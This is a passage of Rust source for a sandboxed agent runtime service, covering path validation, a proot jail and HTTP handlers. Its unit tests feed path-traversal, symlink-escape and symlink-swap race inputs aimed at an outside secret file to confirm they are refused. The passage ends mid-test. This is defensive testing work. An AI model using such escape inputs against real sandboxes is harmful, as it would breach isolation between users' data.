    ensure_reset_target(state, path).await?;
    Ok(true)
}

fn authorize(state: &AppState, headers: &HeaderMap) -> Result<(), RuntimeError> {
    let Some(token) = &state.auth_token else {
        return Ok(());
    };
    let got = headers
        .get(axum::http::header::AUTHORIZATION)
        .and_then(|v| v.to_str().ok())
        .unwrap_or("");
    if got == format!("Bearer {token}") {
        Ok(())
    } else {
        Err(RuntimeError::forbidden("unauthorized"))
    }
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum AccessMode {
    Read,
    Write,
}

async fn resolve_virtual_path(
    state: &AppState,
    common: &CommonRequest,
    raw: &str,
    mode: AccessMode,
) -> Result<PathBuf, RuntimeError> {
    let workspace = namespace_workspace(state, &common.namespace);
    fs::create_dir_all(&workspace)
        .await
        .map_err(|e| RuntimeError::internal(format!("create namespace failed: {e}")))?;

    let raw = if raw.trim().is_empty() {
        "/workspace"
    } else {
        raw.trim()
    };
    let (base, rel) = split_virtual_path(state, &workspace, &common.cwd, raw)?;
    if mode == AccessMode::Write && base.as_path() == state.skills_root.as_path() {
        return Err(RuntimeError::forbidden("skills are read-only"));
    }
    let candidate = safe_join(&base, &rel)?;
    ensure_within(&candidate, &base).await?;
    Ok(candidate)
}

fn split_virtual_path(
    state: &AppState,
    workspace: &Path,
    cwd: &str,
    raw: &str,
) -> Result<(PathBuf, PathBuf), RuntimeError> {
    let raw = raw.replace('\\', "/");
    if raw == "/workspace" {
        return Ok((workspace.to_path_buf(), PathBuf::new()));
    }
    if let Some(rest) = raw.strip_prefix("/workspace/") {
        return Ok((workspace.to_path_buf(), PathBuf::from(rest)));
    }
    if raw == "/skills" {
        return Ok((state.skills_root.clone(), PathBuf::new()));
    }
    if let Some(rest) = raw.strip_prefix("/skills/") {
        return Ok((state.skills_root.clone(), PathBuf::from(rest)));
    }
    if raw.starts_with('/') {
        return Err(RuntimeError::forbidden(
            "absolute paths must be under /workspace or /skills",
        ));
    }
    let (cwd_base, cwd_rel) = split_virtual_path(state, workspace, "/workspace", cwd)?;
    Ok((cwd_base, cwd_rel.join(raw)))
}

fn safe_join(base: &Path, rel: &Path) -> Result<PathBuf, RuntimeError> {
    for component in rel.components() {
        match component {
            Component::ParentDir | Component::RootDir | Component::Prefix(_) => {
                return Err(RuntimeError::forbidden("path traversal is not allowed"));
            }
            _ => {}
        }
    }
    Ok(base.join(rel))
}

async fn ensure_within(path: &Path, base: &Path) -> Result<(), RuntimeError> {
    let canonical_base = fs::canonicalize(base)
        .await
        .map_err(|e| RuntimeError::internal(format!("canonicalize base failed: {e}")))?;
    let mut existing = path;
    loop {
        match fs::symlink_metadata(existing).await {
            Ok(_) => break,
            Err(error) if error.kind() == std::io::ErrorKind::NotFound => {
                existing = existing
                    .parent()
                    .ok_or_else(|| RuntimeError::forbidden("resolved path escapes namespace"))?;
            }
            Err(error) => {
                return Err(RuntimeError::internal(format!(
                    "inspect path failed: {error}"
                )));
            }
        }
    }
    let canonical_existing = fs::canonicalize(existing)
        .await
        .map_err(|e| RuntimeError::internal(format!("canonicalize path failed: {e}")))?;
    if canonical_existing.starts_with(canonical_base) {
        Ok(())
    } else {
        Err(RuntimeError::forbidden("resolved path escapes namespace"))
    }
}

fn namespace_workspace(state: &AppState, namespace: &str) -> PathBuf {
    state.workspace_root.join(sanitize_namespace(namespace))
}

fn sanitize_namespace(namespace: &str) -> String {
    namespace
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || c == '-' || c == '_' || c == '.' {
                c
            } else {
                '_'
            }
        })
        .collect()
}

async fn shell_exec_target(
    state: &AppState,
    common: &CommonRequest,
    command: &str,
    real_cwd: &Path,
    virtual_cwd: &str,
) -> Result<(ExecTarget, Option<PathBuf>), RuntimeError> {
    if cfg!(windows) {
        return Ok((
            ExecTarget {
                program: PathBuf::from("cmd"),
                args: vec!["/C".to_string(), command.to_string()],
                cwd: real_cwd.to_path_buf(),
            },
            None,
        ));
    }
    match state.bash_sandbox {
        BashSandboxMode::Proot => {
            sandboxed_shell_command(state, common, command, virtual_cwd).await
        }
        #[cfg(test)]
        BashSandboxMode::None => Ok((
            ExecTarget {
                program: PathBuf::from("bash"),
                args: vec!["-lc".to_string(), command.to_string()],
                cwd: real_cwd.to_path_buf(),
            },
            None,
        )),
    }
}

async fn sandboxed_shell_command(
    state: &AppState,
    common: &CommonRequest,
    command: &str,
    virtual_cwd: &str,
) -> Result<(ExecTarget, Option<PathBuf>), RuntimeError> {
    let jail_root = state
        .workspace_root
        .join(".runtime-jails")
        .join(sanitize_namespace(&common.namespace))
        .join(sanitize_namespace(&common.run_id));
    prepare_proot_jail(&jail_root).await?;

    let workspace = namespace_workspace(state, &common.namespace);
    fs::create_dir_all(&workspace)
        .await
        .map_err(|e| RuntimeError::internal(format!("create namespace failed: {e}")))?;

    let mut target = ExecTarget {
        program: PathBuf::from("proot"),
        args: vec!["-r".to_string(), jail_root.to_string_lossy().into_owned()],
        cwd: PathBuf::from("/"),
    };
    add_proot_bind(&mut target, Path::new("/bin"), "/bin", &jail_root).await?;
    add_proot_bind(&mut target, Path::new("/usr"), "/usr", &jail_root).await?;
    add_proot_bind(&mut target, Path::new("/lib"), "/lib", &jail_root).await?;
    add_proot_bind_if_exists(&mut target, Path::new("/lib64"), "/lib64", &jail_root).await?;
    add_proot_bind(&mut target, Path::new("/etc"), "/etc", &jail_root).await?;
    add_proot_bind(&mut target, &workspace, "/workspace", &jail_root).await?;
    add_proot_bind(&mut target, &state.skills_root, "/skills", &jail_root).await?;
    add_proot_bind(&mut target, &jail_root.join("tmp"), "/tmp", &jail_root).await?;
    add_proot_bind_if_exists(&mut target, Path::new("/dev/null"), "/dev/null", &jail_root).await?;
    target.args.extend([
        "-w".to_string(),
        virtual_cwd.to_string(),
        "/bin/bash".to_string(),
        "-lc".to_string(),
        command.to_string(),
    ]);
    Ok((target, Some(jail_root)))
}

async fn prepare_proot_jail(root: &Path) -> Result<(), RuntimeError> {
    for dir in [
        "bin",
        "usr",
        "lib",
        "lib64",
        "etc",
        "workspace",
        "skills",
        "tmp",
        "dev",
    ] {
        fs::create_dir_all(root.join(dir))
            .await
            .map_err(|e| RuntimeError::internal(format!("create sandbox root failed: {e}")))?;
    }
    if fs::metadata(root.join("dev/null")).await.is_err() {
        fs::write(root.join("dev/null"), b"")
            .await
            .map_err(|e| RuntimeError::internal(format!("create sandbox null failed: {e}")))?;
    }
    Ok(())
}

async fn add_proot_bind(
    target: &mut ExecTarget,
    host: &Path,
    guest: &str,
    jail_root: &Path,
) -> Result<(), RuntimeError> {
    let bind_target = jail_root.join(guest.trim_start_matches('/'));
    if guest == "/dev/null" || bind_source_is_file(host) {
        if let Some(parent) = bind_target.parent() {
            fs::create_dir_all(parent)
                .await
                .map_err(|e| RuntimeError::internal(format!("create bind parent failed: {e}")))?;
        }
        if fs::metadata(&bind_target).await.is_err() {
            fs::write(&bind_target, b"")
                .await
                .map_err(|e| RuntimeError::internal(format!("create bind file failed: {e}")))?;
        }
    } else {
        fs::create_dir_all(&bind_target)
            .await
            .map_err(|e| RuntimeError::internal(format!("create bind target failed: {e}")))?;
    }
    target
        .args
        .extend(["-b".to_string(), format!("{}:{guest}", host.display())]);
    Ok(())
}

fn bind_source_is_file(path: &Path) -> bool {
    if path.is_file() {
        return true;
    }
    #[cfg(unix)]
    {
        use std::os::unix::fs::FileTypeExt as _;
        return path
            .metadata()
            .map(|metadata| metadata.file_type().is_socket())
            .unwrap_or(false);
    }
    #[cfg(not(unix))]
    {
        false
    }
}

async fn add_proot_bind_if_exists(
    target: &mut ExecTarget,
    host: &Path,
    guest: &str,
    jail_root: &Path,
) -> Result<(), RuntimeError> {
    if host.exists() {
        add_proot_bind(target, host, guest, jail_root).await?;
    }
    Ok(())
}

fn normalize_virtual_cwd(cwd: &str) -> Result<String, RuntimeError> {
    let raw = cwd.trim().replace('\\', "/");
    if raw.is_empty() {
        return Ok("/workspace".to_string());
    }
    if raw == "/workspace"
        || raw.starts_with("/workspace/")
        || raw == "/skills"
        || raw.starts_with("/skills/")
    {
        validate_virtual_path(&raw)?;
        return Ok(raw);
    }
    if raw.starts_with('/') {
        return Err(RuntimeError::forbidden(
            "absolute cwd must be under /workspace or /skills",
        ));
    }
    validate_virtual_path(&raw)?;
    Ok(format!("/workspace/{raw}"))
}

fn validate_virtual_path(raw: &str) -> Result<(), RuntimeError> {
    for component in Path::new(raw).components() {
        match component {
            Component::ParentDir | Component::Prefix(_) => {
                return Err(RuntimeError::forbidden("path traversal is not allowed"));
            }
            _ => {}
        }
    }
    Ok(())
}

impl BashSandboxMode {
    fn as_str(self) -> &'static str {
        match self {
            #[cfg(test)]
            Self::None => "none",
            Self::Proot => "proot",
        }
    }
}

fn parse_timeout(raw: &str) -> Option<Duration> {
    let raw = raw.trim();
    if raw.is_empty() {
        return None;
    }
    if let Some(stripped) = raw.strip_suffix("ms") {
        return stripped.parse::<u64>().ok().map(Duration::from_millis);
    }
    if let Some(stripped) = raw.strip_suffix('s') {
        return stripped.parse::<u64>().ok().map(Duration::from_secs);
    }
    raw.parse::<u64>().ok().map(Duration::from_secs)
}

fn truncate_output(value: String, limit: usize) -> (String, bool) {
    if limit == 0 || value.len() <= limit {
        return (value, false);
    }
    let mut end = limit;
    while !value.is_char_boundary(end) {
        end -= 1;
    }
    let mut out = value[..end].to_string();
    out.push_str(TRUNCATION_MARKER);
    (out, true)
}

async fn write_trace(
    state: &AppState,
    common: &CommonRequest,
    op: &str,
    start: Instant,
    err: Option<&RuntimeError>,
    exit_code: Option<i32>,
    truncated: bool,
) {
    let record = TraceRecord {
        run_id_hash: hash(&common.run_id),
        namespace_hash: hash(&common.namespace),
        op: op.to_string(),
        duration_ms: start.elapsed().as_millis(),
        ok: err.is_none(),
        error: err.map(|e| e.message.clone()).unwrap_or_default(),
        exit_code,
        truncated,
        timestamp_ms: SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_millis(),
    };
    if err.is_some() {
        warn!(run_id_hash = %record.run_id_hash, op = %record.op, error = %record.error, "runtime operation failed");
    } else {
        info!(run_id_hash = %record.run_id_hash, op = %record.op, duration_ms = record.duration_ms, "runtime operation completed");
    }
    let Ok(line) = serde_json::to_vec(&record) else {
        return;
    };
    if let Some(parent) = state.trace_jsonl_path.parent() {
        let _ = fs::create_dir_all(parent).await;
    }
    if let Ok(mut f) = fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&state.trace_jsonl_path)
        .await
    {
        let _ = f.write_all(&line).await;
        let _ = f.write_all(b"\n").await;
    }
}

fn hash(value: &str) -> String {
    let mut hasher = Sha256::new();
    hasher.update(value.as_bytes());
    hex_string(&hasher.finalize())
}

fn hex_string(bytes: &[u8]) -> String {
    bytes.iter().map(|b| format!("{b:02x}")).collect()
}

fn default_cwd() -> String {
    "/workspace".to_string()
}

impl Default for TextResponse {
    fn default() -> Self {
        Self {
            content: String::new(),
            output: String::new(),
            ok: false,
            bytes: 0,
            truncated: false,
            error: String::new(),
        }
    }
}

pub fn request_with_json(path: &str, body: serde_json::Value) -> Request<Body> {
    Request::builder()
        .method("POST")
        .uri(path)
        .header("content-type", "application/json")
        .body(Body::from(body.to_string()))
        .unwrap()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::runtime_security::RuntimeFetchSecurity;
    use axum::body::to_bytes;
    use serde_json::json;
    use tempfile::tempdir;
    use tower::ServiceExt;

    fn test_state() -> AppState {
        let root = tempdir().unwrap().keep();
        let skills = tempdir().unwrap().keep();
        let workspace_budget = WorkspaceBudget::new(&root, 64 * 1024 * 1024).unwrap();
        let fetch_security = RuntimeFetchSecurity::new(
            root.join("fetch.sock"),
            b"a sufficiently long runtime unit test key",
            crate::config::FetchClaimLimits {
                protocol_version: crate::fetch_protocol::FETCH_PROTOCOL_VERSION,
                policy_version: "policy-v1".to_string(),
                max_concurrency: 2,
                max_requests: 20,
                max_request_bytes: 8 * 1024 * 1024,
                max_response_bytes: 32 * 1024 * 1024,
            },
        )
        .unwrap();
        let fetch_proxy = RuntimeFetchProxy::enabled(fetch_security, workspace_budget.clone());
        let command_supervisor = CommandSupervisor::test_direct();
        let bash_health = command_supervisor.health();
        crate::sandbox::harden_runtime_supervisor().unwrap();
        AppState {
            workspace_root: root,
            skills_root: skills,
            auth_token: None,
            max_output_chars: 128,
            command_timeout: Duration::from_secs(5),
            trace_jsonl_path: tempdir().unwrap().keep().join("trace.jsonl"),
            bash_sandbox: BashSandboxMode::None,
            command_supervisor: Some(command_supervisor),
            bash_health,
            fetch_proxy,
            require_fetch_for_readiness: false,
            bash_readiness_error: String::new(),
            workspace_budget,
        }
    }

    fn get_request(path: &str) -> Request<Body> {
        Request::builder()
            .method("GET")
            .uri(path)
            .body(Body::empty())
            .unwrap()
    }

    #[cfg(target_os = "linux")]
    async fn assert_background_process_exits(pid_file: &Path) {
        let pid = std::fs::read_to_string(pid_file)
            .expect("background command should write its pid")
            .trim()
            .parse::<u32>()
            .expect("background pid should be numeric");
        let process_path = PathBuf::from(format!("/proc/{pid}"));
        for _ in 0..40 {
            if !process_path.exists() || process_is_zombie(&process_path) {
                return;
            }
            tokio::time::sleep(Duration::from_millis(50)).await;
        }
        panic!("background process {pid} still exists after command cleanup");
    }

    #[cfg(target_os = "linux")]
    fn process_is_zombie(process_path: &Path) -> bool {
        std::fs::read_to_string(process_path.join("status"))
            .ok()
            .and_then(|status| {
                status
                    .lines()
                    .find(|line| line.starts_with("State:"))
                    .and_then(|line| line.split_whitespace().nth(1))
                    .map(|state| state == "Z")
            })
            .unwrap_or(false)
    }

    #[cfg(target_os = "linux")]
    async fn kill_test_process_from_pid_file(pid_file: &Path) {
        let pid = std::fs::read_to_string(pid_file)
            .expect("escaped command should write its pid")
            .trim()
            .parse::<libc::pid_t>()
            .expect("escaped pid should be numeric");
        unsafe {
            libc::kill(pid, libc::SIGKILL);
        }
        let process_path = PathBuf::from(format!("/proc/{pid}"));
        for _ in 0..40 {
            if !process_path.exists() {
                return;
            }
            tokio::time::sleep(Duration::from_millis(50)).await;
        }
        panic!("test cleanup could not kill escaped process {pid}");
    }

    #[cfg(unix)]
    fn create_dir_symlink(target: &Path, link: &Path) -> std::io::Result<()> {
        std::os::unix::fs::symlink(target, link)
    }

    #[cfg(windows)]
    fn create_dir_symlink(target: &Path, link: &Path) -> std::io::Result<()> {
        std::os::windows::fs::symlink_dir(target, link)
    }

    #[cfg(unix)]
    fn create_file_symlink(target: &Path, link: &Path) -> std::io::Result<()> {
        std::os::unix::fs::symlink(target, link)
    }

    #[cfg(windows)]
    fn create_file_symlink(target: &Path, link: &Path) -> std::io::Result<()> {
        std::os::windows::fs::symlink_file(target, link)
    }

    #[test]
    fn namespace_is_sanitized() {
        assert_eq!(sanitize_namespace("bot:tg:-100"), "bot_tg_-100");
    }

    #[test]
    fn output_truncation_respects_utf8() {
        let (out, truncated) = truncate_output("你好hello".to_string(), 7);
        assert!(truncated);
        assert!(out.starts_with("你好h"));
    }

    #[tokio::test]
    async fn output_collector_limits_retained_bytes_at_utf8_boundary() {
        let (mut writer, reader) = tokio::io::duplex(64);
        let writer_task = tokio::spawn(async move {
            writer.write_all("你好".as_bytes()).await.unwrap();
        });

        let output = collect_output(reader, 4).await.unwrap();
        writer_task.await.unwrap();

        assert!(output.truncated);
        assert_eq!(output.bytes.len(), 4);
        let formatted = format_collected_output(output);
        assert_eq!(formatted, "你\n[truncated]");
        assert!(!formatted.contains('\u{fffd}'));
    }

    #[tokio::test]
    async fn write_read_and_grep_are_namespace_isolated() {
        let state = test_state();
        let app = app(state);

        let write_resp = app
            .clone()
            .oneshot(request_with_json(
                "/v1/write",
                json!({
                    "namespace": "bot:tg:-1",
                    "run_id": "run_test",
                    "path": "/workspace/notes/deep/a.txt",
                    "content": "alpha\nbeta\n",
                }),
            ))
            .await
            .unwrap();
        assert_eq!(write_resp.status(), StatusCode::OK);

        let read_resp = app
            .clone()
            .oneshot(request_with_json(
                "/v1/read",
                json!({
                    "namespace": "bot:tg:-1",
                    "run_id": "run_test",
                    "path": "/workspace/notes/deep/a.txt",
                }),
            ))
            .await
            .unwrap();
        assert_eq!(read_resp.status(), StatusCode::OK);
        let body = to_bytes(read_resp.into_body(), usize::MAX).await.unwrap();
        let parsed: TextResponse = serde_json::from_slice(&body).unwrap();
        assert!(parsed.content.contains("alpha"));

        let grep_resp = app
            .oneshot(request_with_json(
                "/v1/grep",
                json!({
                    "namespace": "bot:tg:-1",
                    "run_id": "run_test",
                    "pattern": "beta",
                    "path": "/workspace",
                }),
            ))
            .await
            .unwrap();
        let body = to_bytes(grep_resp.into_body(), usize::MAX).await.unwrap();
        let parsed: TextResponse = serde_json::from_slice(&body).unwrap();
        assert!(parsed.output.contains("/workspace/notes/deep/a.txt:2:beta"));
        assert!(!parsed.output.contains("workspaces"));
    }

    #[tokio::test]
    async fn status_requires_auth_when_configured() {
        let mut state = test_state();
        state.auth_token = Some("secret".to_string());
        let app = app(state);

        let denied = app
            .clone()
            .oneshot(get_request("/v1/status"))
            .await
            .unwrap();
        assert_eq!(denied.status(), StatusCode::FORBIDDEN);

        let allowed = app
            .oneshot(
                Request::builder()
                    .method("GET")
                    .uri("/v1/status")
                    .header("authorization", "Bearer secret")
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(allowed.status(), StatusCode::OK);
    }

    #[tokio::test]
    async fn status_reports_independent_bash_and_fetch_readiness_without_secrets() {
        let mut state = test_state();
        state.require_fetch_for_readiness = true;
        fs::write(state.fetch_proxy.socket_path().unwrap(), b"not a broker")
            .await
            .unwrap();
        let response = app(state).oneshot(get_request("/v1/status")).await.unwrap();
        assert_eq!(response.status(), StatusCode::OK);
        let body = to_bytes(response.into_body(), usize::MAX).await.unwrap();
        let status: serde_json::Value = serde_json::from_slice(&body).unwrap();

        assert_eq!(status["ok"], false);
        assert_eq!(status["bash_ready"], true);
        assert_eq!(status["fetch_enabled"], true);
        assert_eq!(status["fetch_ready"], false);
        assert_eq!(status["policy_version"], "policy-v1");
        assert_eq!(status["readiness_error"], "fetch broker unavailable");
        let serialized = String::from_utf8(body.to_vec()).unwrap();
        assert!(!serialized.contains("runtime unit test key"));
        assert!(!serialized.contains("AGENT_FETCH_TOKEN"));
    }

    #[tokio::test]
    async fn optional_fetch_outage_does_not_disable_local_readiness() {
        let state = test_state();
        let response = app(state).oneshot(get_request("/v1/status")).await.unwrap();
        let body = to_bytes(response.into_body(), usize::MAX).await.unwrap();
        let status: serde_json::Value = serde_json::from_slice(&body).unwrap();

        assert_eq!(status["ok"], true);
        assert_eq!(status["bash_ready"], true);
        assert_eq!(status["fetch_ready"], false);
        assert_eq!(status["readiness_error"], "");
    }

    #[tokio::test]
    async fn write_and_edit_capacity_failures_preserve_existing_file() {
        let mut write_state = test_state();
        write_state.workspace_budget =
            WorkspaceBudget::new(&write_state.workspace_root, 4).unwrap();
        let write_app = app(write_state.clone());
        let initial = write_app
            .clone()
            .oneshot(request_with_json(
                "/v1/write",
                json!({
                    "namespace": "budget",
                    "run_id": "write",
                    "path": "/workspace/note.txt",
                    "content": "old\n",
                }),
            ))
            .await
            .unwrap();
        assert_eq!(initial.status(), StatusCode::OK);
        let rejected = write_app
            .oneshot(request_with_json(
                "/v1/write",
                json!({
                    "namespace": "budget",
                    "run_id": "write",
                    "path": "/workspace/note.txt",
                    "content": "too large",
                }),
            ))
            .await
            .unwrap();
        assert_eq!(rejected.status(), StatusCode::BAD_REQUEST);
        assert_eq!(
            fs::read_to_string(namespace_workspace(&write_state, "budget").join("note.txt"))
                .await
                .unwrap(),
            "old\n"
        );

        let edit_app = app(write_state.clone());
        let rejected = edit_app
            .oneshot(request_with_json(
                "/v1/edit",
                json!({
                    "namespace": "budget",
                    "run_id": "edit",
                    "path": "/workspace/note.txt",
                    "patch": "@@ -1 +1 @@\n-old\n+expanded\n",
                }),
            ))
            .await
            .unwrap();
        assert_eq!(rejected.status(), StatusCode::BAD_REQUEST);
        assert_eq!(
            fs::read_to_string(namespace_workspace(&write_state, "budget").join("note.txt"))
                .await
                .unwrap(),
            "old\n"
        );
    }

    #[tokio::test]
    async fn skills_are_readable_but_not_writable() {
        let state = test_state();
        fs::create_dir_all(state.skills_root.join("demo"))
            .await
            .unwrap();
        fs::write(state.skills_root.join("demo/SKILL.md"), b"# Demo\n")
            .await
            .unwrap();
        let app = app(state);

        let read_resp = app
            .clone()
            .oneshot(request_with_json(
                "/v1/read",
                json!({
                    "namespace": "bot:tg:-1",
                    "run_id": "run_test",
                    "path": "/skills/demo/SKILL.md",
                }),
            ))
            .await
            .unwrap();
        assert_eq!(read_resp.status(), StatusCode::OK);
        let body = to_bytes(read_resp.into_body(), usize::MAX).await.unwrap();
        let parsed: TextResponse = serde_json::from_slice(&body).unwrap();
        assert!(parsed.content.contains("# Demo"));

        let grep_resp = app
            .clone()
            .oneshot(request_with_json(
                "/v1/grep",
                json!({
                    "namespace": "bot:tg:-1",
                    "run_id": "run_test",
                    "pattern": "Demo",
                    "path": "/skills",
                }),
            ))
            .await
            .unwrap();
        assert_eq!(grep_resp.status(), StatusCode::OK);
        let body = to_bytes(grep_resp.into_body(), usize::MAX).await.unwrap();
        let parsed: TextResponse = serde_json::from_slice(&body).unwrap();
        assert!(parsed.output.contains("/skills/demo/SKILL.md:1:# Demo"));
        assert!(!parsed.output.contains("skills_root"));

        let write_resp = app
            .oneshot(request_with_json(
                "/v1/write",
                json!({
                    "namespace": "bot:tg:-1",
                    "run_id": "run_test",
                    "path": "/skills/demo/SKILL.md",
                    "content": "changed",
                }),
            ))
            .await
            .unwrap();
        assert_eq!(write_resp.status(), StatusCode::FORBIDDEN);
    }

    #[tokio::test]
    async fn edit_applies_patch_and_skills_stay_read_only() {
        let state = test_state();
        fs::create_dir_all(state.skills_root.join("demo"))
            .await
            .unwrap();
        fs::write(state.skills_root.join("demo/SKILL.md"), b"# Demo\n")
            .await
            .unwrap();
        let app = app(state);

        let write_resp = app
            .clone()
            .oneshot(request_with_json(
                "/v1/write",
                json!({
                    "namespace": "bot:tg:-1",
                    "run_id": "run_test",
                    "path": "/workspace/notes/a.txt",
                    "content": "hello\nworld\n",
                }),
            ))
            .await
            .unwrap();
        assert_eq!(write_resp.status(), StatusCode::OK);

        let edit_resp = app
            .clone()
            .oneshot(request_with_json(
                "/v1/edit",
                json!({
                    "namespace": "bot:tg:-1",
                    "run_id": "run_test",
                    "path": "/workspace/notes/a.txt",
                    "patch": "--- a/notes/a.txt\n+++ b/notes/a.txt\n@@ -1,2 +1,2 @@\n hello\n-world\n+agent\n",
                }),
            ))
            .await
            .unwrap();
        assert_eq!(edit_resp.status(), StatusCode::OK);

        let read_resp = app
            .clone()
            .oneshot(request_with_json(
                "/v1/read",
                json!({
                    "namespace": "bot:tg:-1",
                    "run_id": "run_test",
                    "path": "/workspace/notes/a.txt",
                }),
            ))
            .await
            .unwrap();
        let body = to_bytes(read_resp.into_body(), usize::MAX).await.unwrap();
        let parsed: TextResponse = serde_json::from_slice(&body).unwrap();
        assert!(parsed.content.contains("hello\nagent"));

        let skill_edit_resp = app
            .oneshot(request_with_json(
                "/v1/edit",
                json!({
                    "namespace": "bot:tg:-1",
                    "run_id": "run_test",
                    "path": "/skills/demo/SKILL.md",
                    "patch": "--- a/SKILL.md\n+++ b/SKILL.md\n@@ -1 +1 @@\n-# Demo\n+# Changed\n",
                }),
            ))
            .await
            .unwrap();
        assert_eq!(skill_edit_resp.status(), StatusCode::FORBIDDEN);
    }

    #[tokio::test]
    async fn reset_removes_only_target_namespace() {
        let state = test_state();
        let current = namespace_workspace(&state, "bot:tg:-1");
        let other = namespace_workspace(&state, "bot:tg:-2");
        fs::create_dir_all(&current).await.unwrap();
        fs::create_dir_all(&other).await.unwrap();
        fs::write(current.join("note.txt"), b"delete me")
            .await
            .unwrap();
        fs::write(other.join("note.txt"), b"keep me").await.unwrap();
        let app = app(state);

        let resp = app
            .oneshot(request_with_json(
                "/v1/reset",
                json!({
                    "namespace": "bot:tg:-1",
                    "run_id": "run_test",
                }),
            ))
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::OK);
        let body = to_bytes(resp.into_body(), usize::MAX).await.unwrap();
        let parsed: ResetResponse = serde_json::from_slice(&body).unwrap();
        assert!(parsed.ok);
        assert!(parsed.removed);
        assert!(!current.exists());
        assert!(other.join("note.txt").exists());
    }

    #[tokio::test]
    async fn path_traversal_is_rejected() {
        let state = test_state();
        let app = app(state);
        let resp = app
            .oneshot(request_with_json(
                "/v1/read",
                json!({
                    "namespace": "bot:tg:-1",
                    "run_id": "run_test",
                    "path": "/workspace/../secret",
                }),
            ))
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::FORBIDDEN);
    }

    #[tokio::test]
    async fn write_rejects_symlinked_missing_parent_escape() {
        let state = test_state();
        let workspace = namespace_workspace(&state, "bot:tg:-1");
        let other_workspace = namespace_workspace(&state, "bot:tg:-2");
        fs::create_dir_all(&workspace).await.unwrap();
        fs::create_dir_all(&other_workspace).await.unwrap();
        if let Err(error) = create_dir_symlink(&other_workspace, &workspace.join("escape")) {
            if cfg!(windows) && error.kind() == std::io::ErrorKind::PermissionDenied {
                return;
            }
            panic!("create directory symlink: {error}");
        }
        let escaped_file = other_workspace.join("new/note.txt");
        let app = app(state);

        let response = app
            .oneshot(request_with_json(
                "/v1/write",
                json!({
                    "namespace": "bot:tg:-1",
                    "run_id": "run_symlink_escape",
                    "path": "/workspace/escape/new/note.txt",
                    "content": "escaped",
                }),
            ))
            .await
            .unwrap();

        assert_eq!(response.status(), StatusCode::FORBIDDEN);
        assert!(!escaped_file.exists());
    }

    #[tokio::test]
    async fn write_and_edit_reject_final_symlink_escape() {
        let state = test_state();
        let workspace = namespace_workspace(&state, "bot:tg:-1");
        let outside = tempdir().unwrap().keep();
        let sentinel = outside.join("sentinel.txt");
        fs::create_dir_all(&workspace).await.unwrap();
        fs::write(&sentinel, b"outside sentinel\n").await.unwrap();
        if let Err(error) = create_file_symlink(&sentinel, &workspace.join("link.txt")) {
            if cfg!(windows) && error.kind() == std::io::ErrorKind::PermissionDenied {
                return;
            }
            panic!("create file symlink: {error}");
        }
        let app = app(state);

        let write_response = app
            .clone()
            .oneshot(request_with_json(
                "/v1/write",
                json!({
                    "namespace": "bot:tg:-1",
                    "run_id": "run_final_symlink_write",
                    "path": "/workspace/link.txt",
                    "content": "escaped",
                }),
            ))
            .await
            .unwrap();
        assert!(
            write_response.status() == StatusCode::FORBIDDEN
                || write_response.status() == StatusCode::BAD_REQUEST
        );
        assert_eq!(fs::read(&sentinel).await.unwrap(), b"outside sentinel\n");

        let edit_response = app
            .oneshot(request_with_json(
                "/v1/edit",
                json!({
                    "namespace": "bot:tg:-1",
                    "run_id": "run_final_symlink_edit",
                    "path": "/workspace/link.txt",
                    "patch": "--- a/sentinel.txt\n+++ b/sentinel.txt\n@@ -1 +1 @@\n-outside sentinel\n+escaped\n",
                }),
            ))
            .await
            .unwrap();
        assert!(
            edit_response.status() == StatusCode::FORBIDDEN
                || edit_response.status() == StatusCode::BAD_REQUEST
        );
        assert_eq!(fs::read(&sentinel).await.unwrap(), b"outside sentinel\n");
    }

    #[tokio::test]
    async fn read_and_grep_reject_final_and_parent_symlink_escapes() {
        let state = test_state();
        let workspace = namespace_workspace(&state, "bot:tg:-1");
        let outside = tempdir().unwrap().keep();
        let secret = outside.join("secret.txt");
        fs::create_dir_all(&workspace).await.unwrap();
        fs::write(&secret, b"outside-only-secret\n").await.unwrap();
        if let Err(error) = create_file_symlink(&secret, &workspace.join("final-link.txt")) {
            if cfg!(windows) && error.kind() == std::io::ErrorKind::PermissionDenied {
                return;
            }
            panic!("create file symlink: {error}");
        }
        if let Err(error) = create_dir_symlink(&outside, &workspace.join("parent-link")) {
            if cfg!(windows) && error.kind() == std::io::ErrorKind::PermissionDenied {
                return;
            }
            panic!("create directory symlink: {error}");
        }
        let app = app(state);

        for path in [
            "/workspace/final-link.txt",
            "/workspace/parent-link/secret.txt",
        ] {
            let read_response = app
                .clone()
                .oneshot(request_with_json(
                    "/v1/read",
                    json!({
                        "namespace": "bot:tg:-1",
                        "run_id": "run_symlink_read",
                        "path": path,
                    }),
                ))
                .await
                .unwrap();
            assert!(read_response.status().is_client_error());

            let grep_response = app
                .clone()
                .oneshot(request_with_json(
                    "/v1/grep",
                    json!({
                        "namespace": "bot:tg:-1",
                        "run_id": "run_symlink_grep",
                        "pattern": "outside-only-secret",
                        "path": path,
                    }),
                ))
                .await
                .unwrap();
            assert!(grep_response.status().is_client_error());
        }

        assert_eq!(fs::read(&secret).await.unwrap(), b"outside-only-secret\n");
    }

    #[cfg(target_os = "linux")]
    #[tokio::test]
    async fn write_rejects_symlink_swap_race() {
        use rustix::fs::{RenameFlags, renameat_with};
        use std::sync::atomic::{AtomicBool, Ordering};

        let state = test_state();
        let workspace = namespace_workspace(&state, "bot:tg:-1");
        let outside = tempdir().unwrap().keep();
        let sentinel = outside.join("note");
        fs::create_dir_all(workspace.join("pivot")).await.unwrap();
        fs::write(&sentinel, b"outside sentinel\n").await.unwrap();
        create_dir_symlink(&outside, &workspace.join("pivot-link")).unwrap();

        let swapping = Arc::new(AtomicBool::new(true));
        let switcher = {
            let swapping = Arc::clone(&swapping);
            let workspace = workspace.clone();
            std::thread::spawn(move || {
                let workspace_dir = std::fs::File::open(workspace).unwrap();
                while swapping.load(Ordering::Relaxed) {
                    renameat_with(
                        &workspace_dir,
                        "pivot",
                        &workspace_dir,
                        "pivot-link",
                        RenameFlags::EXCHANGE,
                    )
                    .unwrap();
                }
            })
        };

        let app = app(state);
        let mut statuses = Vec::new();
        for _ in 0..200 {
            let response = app
                .clone()
